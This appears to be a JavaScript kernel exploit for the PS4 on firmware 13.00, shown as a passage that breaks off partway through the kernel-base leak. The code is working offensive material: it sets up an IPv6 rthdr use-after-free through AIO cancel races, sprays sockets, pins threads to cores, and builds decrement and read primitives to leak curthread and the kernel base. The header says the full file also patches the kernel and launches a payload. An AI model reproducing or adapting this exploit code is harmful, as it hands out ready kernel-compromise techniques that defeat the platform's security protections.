// PS4 13.00 Relapse/poops kernel exploit, written for wobkot's own engine.
//
// WebKitty's 13.00 stage uses the same IPv6 rthdr UAF ("poops"/NetControl)
// bug as our old netctrl.js, but anchors kernel base with a hardware-proven
// IDT gate sweep instead of the unreliable kqueue leak. This file keeps
// wobkot's WebKit/userland, syscall wrappers, Thread API, pipe KernelView,
// kernel patch, payload launch, and bundled payload. Only the 13.00 kernel
// RVAs and exploit geometry come from WebKitty's 13.00 offset table.
//
// Sets globals expected by kernel.js before returning:
//   kernel_base, fdt_ofiles, kv

//#region Constants
const PR_IPPROTO_IPV6 = 41;
const PR_IPV6_RTHDR = 51;
const PR_AF_INET6 = 28;
const PR_SOCK_DGRAM = 2;
const PR_AF_UNIX = 1;
const PR_SOCK_STREAM = 1;
const PR_SOL_SOCKET = 0xffff;
const PR_SO_TYPE = 0x1008;

const PR_NUM = 9;
const PR_RTH_N = 16;
const PR_RTH_SIZE = 16 * PR_RTH_N + 8; // 0x108
const PR_RTH_LEN = 2 * PR_RTH_N; // 32
const PR_RTH_SEGLEFT = PR_RTH_N; // 16
const PR_SCRATCH_PAGE = (PR_RTH_N << 24) >>> 0; // 0x10000000
const PR_NODE0_DEC = ((PR_RTH_SEGLEFT << 24) | (PR_RTH_LEN << 8)) >>> 0;
const PR_NODE_SZ = 0x38;
const PR_SPRAY = 512;
const PR_N_LEAK = 262144;
const PR_SPIN = 40000000;
const PR_NBLOCK = 8;
const PR_TOWAIT = 1000;

const PR_AIO_CMD_READ = 1;
const PR_AIO_CMD_MULTI = 0x1000;
const PR_AIO_PRIORITY_HIGH = 3;

const PR_OWNER_OFF = 0x18;
const PR_OWNER_LO = PR_OWNER_OFF >>> 2; // word index 6
const PR_OWNER_HI = (PR_OWNER_OFF + 4) >>> 2; // word index 7

const PR_STEP_OFF = 2;
const PR_STEP_MAG = 0x10000;
const PR_PAIR = PR_STEP_MAG + 1; // 0x10001
const PR_KA = 32768;
const PR_KB = PR_PAIR;

const PR_TD_UCRED_OFF = 0x130;
const PR_TD_PROC = 0x8;
const PR_P_UCRED = 0x40;
const PR_P_FD = 0x48;

const PR_IDT = new BInt('0xffffff8000001a00');
const PR_GATE_SZ = 16;
const PR_K_IDT_RSVD = 0x1c1d40;
const PR_SWEEP_STEP = 0x1000000;
const PR_SWEEP = 256;
const PR_KBASE_ALIGN = 0x4000;

const PR_CPU_LEVEL_WHICH = 3;
const PR_CPU_WHICH_TID = 1;
const PR_CPUSET_SZ = 0x10;

const PR_PROT_RW = 3;
const PR_MAP_PRIVATE = 2;
const PR_MAP_FIXED = 0x10;
const PR_MAP_ANON = 0x1000;
const PR_SCRATCH_BI = new BInt(PR_SCRATCH_PAGE);

const PR_OID_KERN_FILE = 0x1a2f8a0;
const PR_OID_MAXFILESPERPROC = 0x1a2f950;
const PR_OID_MAXPROCPERUID = 0x1a3ba88;
const PR_OID_MAXFILES = 0x1a2f9a8;
const PR_ARG1_MAXFILESPERPROC = 0x22cc47c;
const PR_ARG1_MAXPROCPERUID = 0x22cc478;
const PR_ARG1_MAXFILES = 0x22cc474;

const PR_OID_ARG1 = 0x18;
const PR_OID_UNHIDE = 0x50;
const PR_KERN_FILE_NUM = 15;
const PR_ONUM_N = 64;
const PR_KF_BYTES = 0x100000;

const PR_PIPE_BUFFER = 0x10;
const PR_MIB_FILE = new Uint32Array([1, PR_KERN_FILE_NUM]);
const PR_MIB_MFPP = new Uint32Array([1, 27]);
const PR_MIB_MPPU = new Uint32Array([1, 28]);
const PR_MIB_MF = new Uint32Array([1, 7]);
//#endregion

//#region Syscalls
// PS4 syscall IDs (WebKitty jb.js:129-154).
fn.aio_multi_delete = new NativeFunction(662, 'number');
fn.aio_multi_wait = new NativeFunction(663, 'number');
fn.aio_multi_poll = new NativeFunction(664, 'number');
fn.aio_multi_cancel = new NativeFunction(666, 'number');
fn.aio_submit_cmd = new NativeFunction(669, 'number');
fn.cpuset_getaffinity = new NativeFunction(487, 'number');
//#endregion

//#region State
const pr_pool = new Array(PR_SPRAY);
const pr_workers = new Array(2);
const pr_block_ss = new Array(2);
const pr_arm_ss = new Array(2);

let pr_mutex_ab = undefined;
let pr_mutex_u32 = undefined;
let pr_mutex_u8 = undefined;
let pr_mutex = undefined;

let pr_node0 = undefined;
let pr_dummy = undefined;
let pr_sink = undefined;
let pr_n0_sink = undefined;
let pr_drain_buf = undefined;

let pr_arm_req = undefined;
let pr_arm_ids = undefined;
let pr_arm_status = undefined;
let pr_arm_buf = undefined;
let pr_timeout = undefined;

let pr_block_req = undefined;
let pr_block_ids = undefined;
let pr_block_status = undefined;
let pr_block_buf = undefined;

let pr_curthread = undefined;
let pr_ucred = undefined;
let kernel_base = undefined;

let pr_main_core = undefined;
let pr_worker_cores = [];
//#endregion

//#region Basic helpers
function pr_bi(v) {
  return v instanceof BInt ? v : new BInt(v);
}

function pr_buf_addr(ab) {
  if (impl && typeof impl.ab_data === 'function') {
    return impl.ab_data(ab);
  }

  const ab_addr = arw.addrof(ab);
  const m_impl = arw.view(ab_addr).getBInt(0x10, true);
  return arw.view(m_impl).getBInt(0x10, true);
}

function pr_reset_mutex() {
  if (pr_mutex_u32 === undefined) return;
  pr_mutex_u32[PR_OWNER_LO] = 4;
  pr_mutex_u32[PR_OWNER_HI] = 0;
}

function pr_counter(addr, index = 0) {
  return 0x40000000 - arw.view(addr.add(index * 4)).getInt32(0, true);
}

function pr_counter_reset(addr, count = 1) {
  const v = arw.view(addr);
  for (let i = 0; i < count; i++) {
    v.setInt32(i * 4, 0x40000000, true);
  }
}

function pr_new_counter(count) {
  const addr = mem.alloc(4 * count);
  pr_counter_reset(addr, count);
  return addr;
}

function pr_bytes32(v) {
  const x = v >>> 0;
  return [x & 0xff, (x >>> 8) & 0xff, (x >>> 16) & 0xff, (x >>> 24) & 0xff];
}

function pr_positions(d) {
  const out = [];
  for (let j = 0; j < d.length; j++) {
    for (let k = 0; k < d[j]; k++) out.push(j);
  }
  return out;
}

// Decrement plan with borrow propagation across the four low bytes.
function pr_byte_dec_plan(cur_lo, tgt_lo) {
  const b = [0, 0, 0, 0, 0, 0, 0, 0];
  const t = [0, 0, 0, 0];
  const pos = [];

  for (let k = 0; k < 4; k++) {
    b[k] = (cur_lo >>> (8 * k)) & 0xff;
    t[k] = (tgt_lo >>> (8 * k)) & 0xff;
  }

  function decwin(j) {
    let borrow = 1;
    for (let k = j; k < 8 && borrow; k++) {
      let v = b[k] - borrow;
      if (v < 0) {
        v += 0x100;
        borrow = 1;
      } else {
        borrow = 0;
      }
      b[k] = v;
    }
  }

  for (let j = 0; j < 4; j++) {
    const d = (b[j] - t[j]) & 0xff;
    for (let q = 0; q < d; q++) {
      pos.push(j);
      decwin(j);
    }
  }

  const low_ok = b.slice(0, 4).every((v, k) => v === t[k]);
  const hi_clean = b.slice(4).every((v) => v === 0);
  if (!low_ok || !hi_clean || pos.length < 1 || pos.length > 4090) {
    throw new Error('Relapse decrement plan refused !!');
  }

  return pos;
}

// Read the current thread's 64-bit cpuset mask (low word is enough here).
function pr_get_affinity(mask_addr) {
  mem.bset(mask_addr, PR_CPUSET_SZ, 0);
  if (
    fn.cpuset_getaffinity.invoke(
      PR_CPU_LEVEL_WHICH,
      PR_CPU_WHICH_TID,
      -1,
      PR_CPUSET_SZ,
      mask_addr,
    ) !== 0
  ) {
    throw new SyscallError('Unable to get Relapse CPU affinity !!');
  }
  return arw.view(mask_addr).getBInt(0, true).lo >>> 0;
}

// Pin and verify. A failed readback is treated as a failed pin; WebKitty
// refuses to run when main and workers cannot be placed on different cores.
function pr_set_affinity(core, mask_addr) {
  const want = (1 << core) >>> 0;
  mem.bset(mask_addr, PR_CPUSET_SZ, 0);
  arw.view(mask_addr).setUint32(0, want, true);

  if (
    fn.cpuset_setaffinity.invoke(
      PR_CPU_LEVEL_WHICH,
      PR_CPU_WHICH_TID,
      -1,
      PR_CPUSET_SZ,
      mask_addr,
    ) !== 0
  ) {
    return false;
  }

  return pr_get_affinity(mask_addr) === want;
}

function pr_select_cores() {
  const mask_addr = mem.alloc(PR_CPUSET_SZ);
  const saved = pr_get_affinity(mask_addr);
  const cores = [];

  for (let i = 0; i < 32; i++) {
    if ((saved & (1 << i)) !== 0) cores.push(i);
  }
  if (cores.length < 2) {
    throw new Error(`Relapse needs at least two CPUs (mask=0x${saved.toString(16)}) !!`);
  }

  // Prefer the historical main core, but fall back to any available core.
  const main = cores.includes(MAIN_CORE) ? MAIN_CORE : cores[0];
  if (!pr_set_affinity(main, mask_addr)) {
    throw new Error(`Unable to pin main thread to core ${main} !!`);
  }
  mem.free(mask_addr);

  pr_main_core = main;
  // WebKitty tries candidate worker cores from highest to lowest and requires
  // a verified set/readback inside each worker before proceeding.
  pr_worker_cores = cores.filter((c) => c !== main).reverse();

  logger.info(`Relapse CPU pin: main=${pr_main_core}, workers=${pr_worker_cores.join(',')}`);
}
//#endregion

//#region Scratch, rthdr chain, spray pool
function pr_init_scratch() {
  const got = fn.mmap.invoke(
    PR_SCRATCH_BI,
    0x10000,
    PR_PROT_RW,
    PR_MAP_FIXED | PR_MAP_ANON | PR_MAP_PRIVATE,
    -1,
    0,
  );
  if (!pr_bi(got).eq(PR_SCRATCH_BI)) {
    throw new Error(`Unable to map Relapse scratch page ${PR_SCRATCH_BI} !!`);
  }

  const verify = make_socket(PR_AF_INET6, PR_SOCK_DGRAM);
  const tmpl = mem.alloc(PR_RTH_SIZE);
  mem.bset(tmpl, PR_RTH_SIZE, 0);
  const tv = arw.view(tmpl);
  tv.setUint8(1, PR_RTH_LEN);
  tv.setUint8(3, PR_RTH_SEGLEFT);
  if (fn.setsockopt.invoke(verify, PR_IPPROTO_IPV6, PR_IPV6_RTHDR, tmpl, PR_RTH_SIZE) !== 0) {
    throw new SyscallError('Unable to seed scratch rthdr !!');
  }

  const len = mem.alloc(8);
  arw.view(len).setUint32(0, PR_RTH_SIZE, true);
  arw.view(len).setUint32(4, 0, true);
  const scratch_rth = PR_SCRATCH_BI.add(0x8000);
  const g = fn.getsockopt.invoke(verify, PR_IPPROTO_IPV6, PR_IPV6_RTHDR, scratch_rth, len);
  const s = fn.setsockopt.invoke(
    verify,
    PR_IPPROTO_IPV6,
    PR_IPV6_RTHDR,
    scratch_rth,
    arw.view(len).getUint32(0, true),
  );
  if (g !== 0 || s !== 0) throw new Error('Relapse scratch page is not kernel R/W !!');

  fn.close.invoke(verify);
  mem.free(tmpl);
  mem.free(len);

  // Fake mutex. The kernel writes curthread into owner @ +0x18/+0x1c.
  pr_mutex_ab = new ArrayBuffer(0xc0);
  pr_mutex_u32 = new Uint32Array(pr_mutex_ab);
  pr_mutex_u8 = new Uint8Array(pr_mutex_ab);
  pr_mutex_u32.fill(0);
  pr_reset_mutex();
  pr_mutex = pr_buf_addr(pr_mutex_ab);

  pr_dummy = pr_new_counter(1);
  pr_sink = pr_new_counter(1);
  pr_n0_sink = pr_new_counter(1);
}

function pr_init_pool() {
  for (let i = 0; i < PR_SPRAY; i++) {
    pr_pool[i] = make_socket(PR_AF_INET6, PR_SOCK_DGRAM);
  }
}

function pr_set_node0(next, second_dec) {
  mem.bset(pr_node0, PR_RTH_SIZE, 0);
  const v = arw.view(pr_node0);
  v.setUint8(1, PR_RTH_LEN);
  v.setUint8(3, PR_RTH_SEGLEFT);
  v.setBInt(0x08, pr_bi(second_dec), true);
  v.setBInt(0x10, pr_mutex, true);
  v.setBInt(0x30, pr_bi(next), true);
}

function pr_preset_node0_dec() {
  const out = mem.alloc(8);
  arw.view(out).setUint32(0, 4, true);
  arw.view(out).setUint32(4, 0, true);
  const rv = fn.getsockopt.invoke(
    pr_pool[0],
    PR_SOL_SOCKET,
    PR_SO_TYPE,
    new BInt(PR_NODE0_DEC),
    out,
  );
  mem.free(out);
  return rv;
}

function pr_free_rthdrs() {
  for (const fd of pr_pool) {
    if (fd === undefined) continue;
    if (fn.setsockopt.invoke(fd, PR_IPPROTO_IPV6, PR_IPV6_RTHDR, 0, 0) !== 0) {
      throw new SyscallError('Unable to free Relapse rthdr !!');
    }
  }
}

function pr_spray_rthdrs() {
  let n = 0;
  for (const fd of pr_pool) {
    if (fn.setsockopt.invoke(fd, PR_IPPROTO_IPV6, PR_IPV6_RTHDR, pr_node0, PR_RTH_SIZE) === 0) {
      n++;
    }
  }
  return n;
}

function pr_chain_new(n) {
  if (n <= 0) throw new Error('Empty Relapse chain !!');
  const addr = mem.alloc(PR_NODE_SZ * n);
  mem.bset(addr, PR_NODE_SZ * n, 0);
  return { addr, n };
}

function pr_chain_link(chain, i, dec, sink, last = false) {
  const o = i * PR_NODE_SZ;
  const v = arw.view(chain.addr);
  v.setBInt(o + 0x00, pr_bi(dec), true);
  v.setBInt(o + 0x08, pr_bi(sink), true);
  v.setBInt(o + 0x10, pr_mutex, true);
  v.setBInt(o + 0x18, 0, true);
  v.setBInt(o + 0x20, 0, true);
  v.setBInt(o + 0x28, 0, true);
  v.setBInt(
    o + 0x30,
    last || i === chain.n - 1 ? 0 : chain.addr.add(o + PR_NODE_SZ),
    true,
  );
}
//#endregion

//#region AIO arming, workers, chain execution
function pr_setup_blocking() {
  const pair = mem.alloc(8);
  if (fn.socketpair.invoke(PR_AF_UNIX, PR_SOCK_STREAM, 0, pair) === -1) {
    throw new SyscallError('Unable to create Relapse blocking socketpair !!');
  }
  pr_block_ss[0] = arw.view(pair).getInt32(0, true);
  pr_block_ss[1] = arw.view(pair).getInt32(4, true);
  mem.free(pair);

  pr_block_buf = mem.alloc(0x40);
  pr_block_req = mem.alloc(0x28 * PR_NBLOCK);
  pr_block_ids = mem.alloc(4 * PR_NBLOCK);
  pr_block_status = mem.alloc(4 * PR_NBLOCK);
  pr_drain_buf = mem.alloc(PR_NBLOCK * 0x40);

  const v = arw.view(pr_block_req);
  for (let k = 0; k < PR_NBLOCK; k++) {
    const o = k * 0x28;
    v.setBInt(o + 0x08, 0x40, true);
    v.setBInt(o + 0x10, pr_block_buf, true);
    v.setInt32(o + 0x20, pr_block_ss[0], true);
  }

  fn.aio_submit_cmd.invoke(
    PR_AIO_CMD_READ | PR_AIO_CMD_MULTI,
    pr_block_req,
    PR_NBLOCK,
    PR_AIO_PRIORITY_HIGH,
    pr_block_ids,
  );
}

function pr_setup_arm_reqs() {
  const pair = mem.alloc(8);
  if (fn.socketpair.invoke(PR_AF_UNIX, PR_SOCK_STREAM, 0, pair) === -1) {
    throw new SyscallError('Unable to create Relapse arm socketpair !!');
  }
  pr_arm_ss[0] = arw.view(pair).getInt32(0, true);
  pr_arm_ss[1] = arw.view(pair).getInt32(4, true);
  mem.free(pair);

  pr_arm_buf = mem.alloc(0x40);
  pr_arm_req = mem.alloc(0x28 * PR_NUM);
  pr_arm_ids = mem.alloc(4 * PR_NUM);
  pr_arm_status = mem.alloc(4 * PR_NUM);
  pr_timeout = mem.alloc(8);

  const v = arw.view(pr_arm_req);
  for (let k = 0; k < PR_NUM; k++) {
    const o = k * 0x28;
    v.setBInt(o + 0x08, 0x40, true);
    v.setBInt(o + 0x10, pr_arm_buf, true);
    v.setInt32(o + 0x20, pr_arm_ss[0], true);
  }
  arw.view(pr_timeout).setUint32(0, PR_TOWAIT, true);
  arw.view(pr_timeout).setUint32(4, 0, true);
}

async function pr_spawn_workers() {
  await load_script('src/thread.js');

  for (let i = 0; i < pr_workers.length; i++) {
    const w = new Thread(`relapse_cancel_${i}`);
    await w.init();

    await w.execute(
      'register',
      'kinit',
      `(cores) => {
        importScripts('kernel.js');
        fn.cpuset_getaffinity = new NativeFunction(487, 'number');

        const CPUSET_SZ = 16;
        const LEVEL_WHICH = 3;
        const WHICH_TID = 1;
        const mask = mem.alloc(CPUSET_SZ);
        let chosen = -1;

        for (const core of cores) {
          mem.bset(mask, CPUSET_SZ, 0);
          arw.view(mask).setUint32(0, (1 << core) >>> 0, true);
          if (fn.cpuset_setaffinity.invoke(LEVEL_WHICH, WHICH_TID, -1, CPUSET_SZ, mask) !== 0) {
            continue;
          }

          mem.bset(mask, CPUSET_SZ, 0);
          if (fn.cpuset_getaffinity.invoke(LEVEL_WHICH, WHICH_TID, -1, CPUSET_SZ, mask) !== 0) {
            continue;
          }
          if (arw.view(mask).getUint32(0, true) === ((1 << core) >>> 0)) {
            chosen = core;
            break;
          }
        }
        mem.free(mask);
        if (chosen < 0) throw new Error('Unable to pin Relapse worker !!');

        set_rtprio(RTP);
        fn.aio_multi_cancel = new NativeFunction(666, 'number');
        return chosen;
      }`,
    );
    await w.execute(
      'register',
      'cancel',
      `(ids, n, out) => {
        fn.aio_multi_cancel.invoke(new BInt(ids), n, new BInt(out));
        return true;
      }`,
    );
    await w.execute(
      'register',
      'spin',
      `() => {
        const sink = new Uint32Array(4);
        let x = 1;
        for (;;) {
          x = (x * 1103515245 + 12345) >>> 0;
          sink[x & 3] = x;
        }
      }`,
    );
    const worker_core = await w.execute('kinit', pr_worker_cores);
    logger.debug(`Relapse worker ${i} pinned on core ${worker_core} !!`);
    pr_workers[i] = w;
  }

  logger.info('Relapse workers pinned !!');
}

function pr_arm_once() {
  pr_free_rthdrs();

  const rv = fn.aio_submit_cmd.invoke(
    PR_AIO_CMD_READ | PR_AIO_CMD_MULTI,
    pr_arm_req,
    PR_NUM,
    PR_AIO_PRIORITY_HIGH,
    pr_arm_ids,
  );
  if (rv !== 0) throw new Error(`Unable to submit Relapse AIO reads: ${rv} !!`);

  arw.view(pr_timeout).setUint32(0, PR_TOWAIT, true);
  arw.view(pr_timeout).setUint32(4, 0, true);
  fn.aio_multi_wait.invoke(pr_arm_ids, PR_NUM, pr_arm_status, 0, pr_timeout);

  const sprayed = pr_spray_rthdrs();
  if (sprayed === 0) throw new Error('No Relapse rthdrs sprayed !!');
  return sprayed;
}

// Retire the whole AIO batch. When a chain is supplied, rewrite its first node
// to a benign one-node list first so the remaining pending cancels cannot walk
// the same decrement chain again (WebKitty's reapNow()/leak-chain cut).
function pr_reap_arm(chain = undefined) {
  if (chain !== undefined) {
    pr_chain_link(chain, 0, pr_dummy, pr_dummy, true);
  }

  fn.aio_multi_cancel.invoke(pr_arm_ids, PR_NUM, pr_arm_status);
  fn.aio_multi_poll.invoke(pr_arm_ids, PR_NUM, pr_arm_status);
  fn.aio_multi_delete.invoke(pr_arm_ids, PR_NUM, pr_arm_status);
}

function pr_who_has_f() {
  const gf = mem.alloc(PR_RTH_SIZE);
  const gl = mem.alloc(8);
  let found = -1;
  let hits = 0;

  for (let i = 0; i < pr_pool.length; i++) {
    mem.bset(gf, PR_RTH_SIZE, 0);
    arw.view(gl).setUint32(0, PR_RTH_SIZE, true);
    arw.view(gl).setUint32(4, 0, true);

    if (fn.getsockopt.invoke(pr_pool[i], PR_IPPROTO_IPV6, PR_IPV6_RTHDR, gf, gl) !== 0) {
      continue;
    }

    if (arw.view(gf).getUint32(0x20, true) !== 0) {
      hits++;
      if (found < 0) found = i;
    }
  }

  mem.free(gf);
  mem.free(gl);
  return { idx: found, hits };
}

// Run one complete chain, using a fresh arming for every chain. WebKitty
// amortises eight fires per arming; that is a timing optimisation, not a
// correctness requirement, and a fresh arm is easier to reason about here.
function pr_run_chain(chain, label) {
  pr_reset_mutex();
  pr_counter_reset(pr_dummy);
  pr_counter_reset(pr_sink);
  pr_counter_reset(pr_n0_sink);
  pr_set_node0(chain.addr, pr_n0_sink);

  pr_arm_once();
  fn.aio_multi_cancel.invoke(pr_arm_ids, 1, pr_arm_status);
  const who = pr_who_has_f();
  const moved = pr_counter(pr_sink);
  const n0 = pr_counter(pr_n0_sink);
  pr_reap_arm(chain);

  if (n0 !== 1 || who.idx < 0) {
    throw new Error(
      `Relapse chain ${label} did not fire (n0=${n0}, f=${who.idx}/${who.hits}) !!`,
    );
  }

  return { moved, n0, who };
}

// WebKitty's decrement oracle: n decrements at one byte; the sink counts how
// many nodes ran before the borrow stopped the walk.
function pr_oracle(addr, n, label) {
  const obs = pr_new_counter(1);
  const chain = pr_chain_new(n);
  for (let k = 0; k < n; k++) pr_chain_link(chain, k, addr, obs);

  try {
    pr_run_chain(chain, label);
    const m = pr_counter(obs);
    return { m, v: m > 0 ? n - m + 1 : 0 };
  } finally {
    mem.free(chain.addr);
    mem.free(obs);
  }
}

// WebKitty's byte-value sweep: subtract 0x1000000 from step byte, observe
// borrow at probe byte (step-3), then decode the unique matching byte.
function pr_sweep_pattern(bv, low) {
  let w = (((bv << 24) >>> 0) | (low & 0xffffff)) | 0;
  let out = '';
  for (let k = 0; k < PR_SWEEP; k++) {
    w = (w - PR_SWEEP_STEP) | 0;
    w = (w - 1) | 0;
    out += w <= 0 ? '1' : '0';
  }
  return out;
}

function pr_decode_sweep(obs, low) {
  let hit = -1;
  let n = 0;
  for (let bv = 0; bv < 256; bv++) {
    if (pr_sweep_pattern(bv, low) === obs) {
      if (hit < 0) hit = bv;
      n++;
    }
  }
  return { b: hit, n };
}

function pr_sweep_byte(step, probe, low, label) {
  const obs = pr_new_counter(PR_SWEEP);
  const chain = pr_chain_new(2 * PR_SWEEP);
  for (let k = 0; k < PR_SWEEP; k++) {
    pr_chain_link(chain, 2 * k, step, pr_dummy);
    pr_chain_link(chain, 2 * k + 1, probe, obs.add(k * 4));
  }

  try {
    pr_run_chain(chain, label);
    let obs_str = '';
    for (let k = 0; k < PR_SWEEP; k++) {
      obs_str += pr_counter(obs, k) > 0 ? '1' : '0';
    }
    return pr_decode_sweep(obs_str, low);
  } finally {
    mem.free(chain.addr);
    mem.free(obs);
  }
}

// WebKitty's multiFire: combine independent sweeps/oracles/decrements into a
// single chain run.
function pr_multi_fire(jobs, label) {
  let need = 0;
  let nsink = 0;
  for (const j of jobs) {
    if (j.kind === 'sweep') {
      need += 2 * PR_SWEEP;
      nsink += PR_SWEEP;
    } else if (j.kind === 'oracle') {
      need += j.n;
      nsink += 1;
    } else {
      need += j.n;
    }
  }

  const obs = pr_new_counter(Math.max(1, nsink));
  const chain = pr_chain_new(need);
  const base = [];
  let i = 0;
  let sk = 0;

  for (const j of jobs) {
    base.push(sk);
    if (j.kind === 'sweep') {
      for (let k = 0; k < PR_SWEEP; k++) {
        pr_chain_link(chain, i++, j.step, pr_dummy);
        pr_chain_link(chain, i++, j.probe, obs.add((sk + k) * 4));
      }
      sk += PR_SWEEP;
    } else if (j.kind === 'oracle') {
      for (let k = 0; k < j.n; k++) {
        pr_chain_link(chain, i++, j.addr, obs.add(sk * 4));
      }
      sk++;
    } else {
      for (let k = 0; k < j.n; k++) pr_chain_link(chain, i++, j.addr, pr_dummy);
    }
  }

  try {
    pr_run_chain(chain, label);
    const out = [];
    for (let q = 0; q < jobs.length; q++) {
      const j = jobs[q];
      if (j.kind === 'sweep') {
        let obs_str = '';
        for (let k = 0; k < PR_SWEEP; k++) {
          obs_str += pr_counter(obs, base[q] + k) > 0 ? '1' : '0';
        }
        out.push(pr_decode_sweep(obs_str, j.low));
      } else if (j.kind === 'oracle') {
        const m = pr_counter(obs, base[q]);
        out.push({ m, v: m > 0 ? j.n - m + 1 : 0 });
      } else {
        out.push({ n: j.n });
      }
    }
    return out;
  } finally {
    mem.free(chain.addr);
    mem.free(obs);
  }
}

// Arbitrary byte decrement primitive consumed by the sysctl setup.
function pr_dec_many(targets) {
  if (targets.length === 0) return;
  const chain = pr_chain_new(targets.length);
  for (let i = 0; i < targets.length; i++) {
    pr_chain_link(chain, i, targets[i], pr_dummy);
  }
  try {
    pr_run_chain(chain, 'dec');
  } finally {
    mem.free(chain.addr);
  }
}

function arb_dec(target, count) {
  const t = pr_bi(target);
  const targets = new Array(count);
  for (let i = 0; i < count; i++) targets[i] = t;
  pr_dec_many(targets);
}
//#endregion

//#region curthread leak
function pr_worker_cancel(i, ids, n, out) {
  return pr_workers[i].execute('cancel', ids.toString(), n, out.toString());
}

async function pr_leak_curthread() {
  const ctr = mem.alloc(0x40);
  arw.view(ctr).setInt32(0x00, 0x40000000, true);
  arw.view(ctr).setInt32(0x10, 0x40000000, true);

  const chain = pr_chain_new(PR_N_LEAK);
  for (let i = 0; i < PR_N_LEAK; i++) {
    pr_chain_link(chain, i, ctr, ctr.add(0x10));
  }

  pr_reset_mutex();
  pr_counter_reset(pr_dummy);
  pr_counter_reset(pr_n0_sink);
  pr_set_node0(chain.addr, ctr.add(0x10));
  if (pr_preset_node0_dec() !== 0) throw new Error('Unable to preset Relapse node0 !!');
  pr_arm_once();

  // Warm the owner cache line.
  let warm = 0;
  for (let i = 0; i < 200000; i++) {
    pr_mutex_u8[0x80 + (i & 15)] = i & 0xff;
    warm ^= pr_mutex_u32[PR_OWNER_LO];
  }

  const pending = pr_worker_cancel(0, pr_arm_ids, 1, pr_arm_status);
  const samples = new Map();
  let hit_lo = 0;
  let hit_hi = 0;
  let hits = 0;

  for (let i = 0; i < PR_SPIN; i++) {
    pr_mutex_u8[0x80 + (i & 15)] = i & 0xff;
    const hi1 = pr_mutex_u32[PR_OWNER_HI] >>> 0;
    if (hi1 === 0) continue;

    const lo = pr_mutex_u32[PR_OWNER_LO] >>> 0;
    const hi2 = pr_mutex_u32[PR_OWNER_HI] >>> 0;
    if (hi1 !== hi2 || lo === 4) continue;

    if (hits === 0) {
      hit_lo = lo;
      hit_hi = hi1;
    }
    hits++;
    if (samples.size < 32) {
      const key = hi1.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0');
      samples.set(key, (samples.get(key) || 0) + 1);
    }
    if (hits > 48) break;
  }

  try {
    await pending;
  } catch (e) {
    // AIO status from the worker is not important; the owner sample is.
  }
  pr_reap_arm(chain);
  mem.free(chain.addr);
  mem.free(ctr);

  if (hits === 0 || hit_hi < 0xffff0000 || samples.size !== 1) {
    throw new Error(
      `Unable to leak curthread (hits=${hits}, hi=0x${hit_hi.toString(16)}, warm=${warm}) !!`,
    );
  }

  pr_curthread = new BInt(hit_hi, hit_lo);
  logger.debug(`Relapse curthread: ${pr_curthread}`);

  // Keep both workers off syscallenter: after the UAF their td_proc may be
  // corrupt, so cred_update_thread() could crfree() the wild td_ucred that
  // passA creates. The promises intentionally never resolve.
  for (const w of pr_workers) {
    if (w !== undefined) w.execute('spin');
  }
  logger.debug('Relapse workers parked !!');

  return pr_curthread;
}
//#endregion

//#region Pointer read via passA/passB
// Reads the low 32 bits of the pointer stored at target. The high dword is
// taken from the canonical kernel pointer prefix 0xffffffff.
async function pr_read_low_dword(target) {
  const DUM = pr_dummy;
  const SNK = pr_sink;
  const X1 = pr_bi(target);

  const subA = (0x100000000 - ((PR_KA * PR_PAIR) % 0x100000000)) % 0x100000000;
  const posA = pr_positions(pr_bytes32(subA));

  let chain = pr_chain_new(2 * PR_KA + posA.length);
  let i = 0;
  for (let j = 0; j < PR_KA; j++) {
    pr_chain_link(chain, i++, X1.add(PR_STEP_OFF), DUM);
    pr_chain_link(chain, i++, X1, SNK);
  }
  for (let j = 0; j < posA.length; j++) {
    pr_chain_link(chain, i++, X1.add(posA[j]), DUM, j === posA.length - 1);
  }

  let mA;
  try {
    pr_run_chain(chain, 'passA');
    mA = pr_counter(SNK);
  } finally {
    mem.free(chain.addr);
  }
  if (mA <= 0) throw new Error('Relapse passA found no crossing !!');

  const kA = PR_KA - mA + 1;
  const red = (kA - 1) * PR_PAIR;
  const posRed = pr_positions(pr_bytes32(red));
  const X2 = X1;

  const totB = (red + PR_KB) % 0x100000000;
  const subB = (0x100000000 - totB) % 0x100000000;
  const posB = pr_positions(pr_bytes32(subB));

  chain = pr_chain_new(posRed.length + PR_KB + posB.length);
  i = 0;
  for (let j = 0; j < posRed.length; j++) {
    pr_chain_link(chain, i++, X2.add(posRed[j]), DUM);
  }
  for (let j = 0; j < PR_KB; j++) {
    pr_chain_link(chain, i++, X2, SNK);
  }
  for (let j = 0; j < posB.length; j++) {
    pr_chain_link(chain, i++, X2.add(posB[j]), DUM, j === posB.length - 1);
  }

  let mB;
  try {
    pr_run_chain(chain, 'passB');
    mB = pr_counter(SNK);
  } finally {
    mem.free(chain.addr);
  }
  if (mB <= 0) throw new Error('Relapse passB found no crossing !!');

  const r = PR_KB - mB + 1;
  const w0 = (red + r) >>> 0;
  if ((w0 & 7) !== 0) throw new Error(`Relapse pointer read misaligned: 0x${w0.toString(16)} !!`);

  logger.debug(`Relapse pointer read: ${X1} -> 0x${w0.toString(16)}`);
  return w0;
}
//#endregion

//#region Kernel base via IDT anchor
async function pr_leak_kernel_base() {
  const B = {};
  const jobs = [
    { n: 'b0', g: 22, j: 0, want: null, low: () => 0x000000 },
    { n: 'b1', g: 24, j: 1, want: null, low: () => (B.b0 << 16) >>> 0 },
    {
      n: 'b3',
      g: 25,
      j: 3,
      want: 0x00,
      low: () => ((0x20 << 16) | (B.b1 << 8) | B.b0) >>> 0,
    },
    { n: 'b5', g: 26, j: 5, want: 0x8e, low: () => 0x000020 },
    { n: 'b6', g: 27, j: 6, want: null, low: () => 0x8e0000 },
    {
      n: 'b7',
      g: 31,
      j: 7,
      want: null,
      low: () => ((B.b6 << 16) | 0x8e00) >>> 0,
    },
    { n: 'b6d', g: 20, j: 6, want: null, low: () => 0x8e0000 },
    {
      n: 'b7d',
      g: 15,
      j: 7,
      want: null,
      low: () => ((B.b6 << 16) | 0x8e00) >>> 0,
    },
  ];

  for (const j of jobs) {
    const off = j.g * PR_GATE_SZ + j.j;
    const step = PR_IDT.add(off);
    const probe = PR_IDT.add(off - 3);
    const d = await pr_sweep_byte(step, probe, j.low(), `idt_${j.n}`);

    if (d.b < 0 || d.n !== 1) {
      throw new Error(`Ambiguous IDT byte ${j.n} (candidates=${d.n}) !!`);
    }
    if (j.want !== null && d.b !== j.want) {
      throw new Error(`Unexpected IDT control byte ${j.n}: 0x${d.b.toString(16)} !!`);
    }
    B[j.n] = d.b;
  }

